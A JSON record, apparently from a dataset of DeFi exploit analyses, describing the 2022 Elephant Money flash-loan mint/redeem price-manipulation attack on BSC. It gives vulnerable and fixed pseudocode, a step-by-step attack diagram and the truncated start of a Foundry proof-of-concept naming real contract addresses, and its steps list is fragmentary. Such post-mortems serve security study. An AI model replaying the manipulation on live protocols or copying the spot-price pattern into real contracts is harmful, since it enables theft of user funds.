@@ -1,0 +1,35 @@
+{
+ "id": "2022__2022-04-12_ElephantMoney_FlashLoanMintRedeemArbitrage",
+ "source_file": "2022/2022-04-12_ElephantMoney_FlashLoanMintRedeemArbitrage.md",
+ "title": "Elephant Money — Flash Loan Trunk Mint/Redeem Arbitrage Analysis",
+ "date": "2022-04-12",
+ "protocol": "Elephant Money",
+ "chain": "BSC",
+ "loss_raw": "~$11,200,000 (BNB, ELEPHANT)",
+ "loss_usd": 11200000.0,
+ "root_cause": "Trunk `mint()`/`redeem()` pricing relies on AMM spot price for ELEPHANT valuation, allowing an attacker to temporarily inflate the price via large swaps and realize arbitrage profit through mint → redeem",
+ "attack_tx": null,
+ "vulnerable_contract": "Elephant Treasury 0xD520a3B47E42a1063617A9b6273B206a07bDf834",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable Elephant Treasury.mint() (pseudocode)\ncontract ElephantTreasury {\n    IElephantToken elephant;\n    IPancakePair elephantWbnbPair;\n\n    // Current AMM spot price of ELEPHANT\n    function getElephantPrice() public view returns (uint256) {\n        (uint112 reserve0, uint112 reserve1,) = elephantWbnbPair.getReserves();\n        //",
+  "❌ AMM spot price — manipulable via flash loan\n        return uint256(reserve1) * 1e18 / uint256(reserve0);\n    }\n\n    // Mint Trunk stablecoin\n    function mint(uint256 elephantAmount) external {\n        //",
+  "❌ TRUNK mint amount calculated using manipulated spot price\n        uint256 trunkAmount = elephantAmount * getElephantPrice() / 1e18;\n        elephant.transferFrom(msg.sender, address(this), elephantAmount);\n        trunk.mint(msg.sender, trunkAmount); // more TRUNK than normal\n    }\n\n    // Redeem Trunk → ELEPHANT\n    function redeem(uint256 trunkAmount) external {\n        //"
+ ],
+ "code_after": [
+  "✅ Correct pattern\ncontract ElephantTreasuryFixed {\n    //",
+  "✅ Use TWAP-based price\n    function getElephantPrice() public view returns (uint256) {\n        return twapOracle.consult(address(elephant), 1e18);\n    }\n}"
+ ],
+ "steps": [
+  "Convert WBNB → ETH",
+  "→ Receive more TRUNK than normal (90,000,000 Trunk)",
+  "Based on lower price → receive more ELEPHANT",
+  "[7] ELEPHANT → BNB → realize profit"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Flash Loan 1: Borrow 100,000 WBNB (BUSD/WBNB Pair)\n    │\n    ├─[2] [Inside pancakeCall 1]\n    │       Flash Loan 2: Borrow 90,000,000 BUSD (BUSD/USDT Pair)\n    │\n    ├─[3] [Inside pancakeCall 2]\n    │       Convert WBNB → ETH\n    │       Buy large amounts of ELEPHANT with ETH (price spikes)\n    │\n    ├─[4] Treasury.mint(large ELEPHANT amount)\n    │       Based on manipulated high ELEPHANT price\n    │       → Receive more TRUNK than normal (90,000,000 Trunk)\n    │\n    ├─[5] Normalize ELEPHANT price\n    │       (Sell some of the purchased ELEPHANT)\n    │\n    ├─[6] Treasury.redeem(90,000,000 TRUNK)\n    │       Based on lower price → receive more ELEPHANT\n    │\n    ├─[7] ELEPHANT → BNB → realize profit\n    │\n    └─[8] Repay Flash Loan 1 and 2 sequentially\n            L",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface ITrunk {\n    function mint(uint256 amount) external;\n    function redeem(uint256 amount) external;\n}\n\ninterface IPancakePair {\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 WBNB     = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 ELEPHANT = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);\n    IERC20 TRUNK    = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);\n    IERC20 BUSD     = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n\n    ITrunk trunk_treasury  = ITrunk(0xD520a3B47E42a1063617A9b6273B206a07bDf834);\n    IPancakePair busdWbnb  = IPancakePair(0x16b9a82891338f9bA"
+ ]
+}
